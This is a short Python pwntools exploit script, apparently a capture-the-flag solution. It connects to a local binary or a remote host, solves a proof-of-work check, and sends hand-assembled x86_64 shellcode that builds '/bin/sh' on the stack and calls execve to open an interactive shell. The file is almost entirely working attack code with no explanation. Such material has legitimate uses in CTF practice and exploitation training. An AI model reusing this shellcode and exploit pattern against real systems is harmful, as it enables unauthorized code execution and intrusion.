#!/usr/bin/env python
from pwn import *
import re

if len(sys.argv) == 1:
    s = process('./vuln')
else:
    s = remote('78.46.163.223', 1336)
    prefix, bits = re.match(r'.*"([0-9a-f]+).* with (\d+)', s.recvline(False)).groups()
    p = process(['./pow-solver', bits, prefix])
    s.sendline(p.recvline(False))
    p.close()

shellcode = asm('''
    xor edi, eax
    xor eax, eax
    mov ah, 0x7a
    imul eax
    mov ah, 0x8c
    xor eax, edi
    mov esp, eax
    pop rsi
    pop rax
    mov ch, 0
    mov cl, 'h'
    push cx
    mov ch, 's'
    mov cl, '/'
    push cx
    mov bh, 'n'
    mov bl, 'i'
    push bx
    mov ch, 'b'
    push cx
    push rsp
    pop rdi
    mov al, 0x3b
''', arch='x86_64')
s.send(shellcode)
s.interactive()
